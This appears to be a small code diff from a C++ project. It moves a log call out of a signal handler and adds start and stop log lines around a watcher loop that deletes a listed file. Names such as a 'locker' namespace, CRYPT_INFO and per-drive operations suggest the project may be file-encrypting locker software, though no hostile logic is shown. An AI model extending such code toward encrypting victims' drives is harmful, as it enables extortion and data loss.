@@ -130,7 +130,6 @@ sig_atomic_t doneman = 1;
 void signal_handler(int)
 {
     doneman = 0;
-    LOG_INFO("shutdown signal");
 }
 
 void watcher_operation(PathSystem& psys, CRYPT_INFO* CryptInfo)
@@ -138,6 +137,7 @@ void watcher_operation(PathSystem& psys, CRYPT_INFO* CryptInfo)
     std::signal(SIGINT, signal_handler);
     std::signal(SIGTERM, signal_handler);
     std::signal(SIGHUP, SIG_IGN);
+    LOG_INFO("watcher loop started");
     while(doneman)
     {
         std::this_thread::sleep_for(std::chrono::milliseconds(2000));
@@ -153,6 +153,7 @@ void watcher_operation(PathSystem& psys, CRYPT_INFO* CryptInfo)
         }
         locker::safe_delete_file(CryptInfo->list_psd);
     }
+    LOG_INFO("watcher loop stopped");
 }
 
 void execute_operation(LIST<DRIVE_INFO>* DriveInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo, int f)
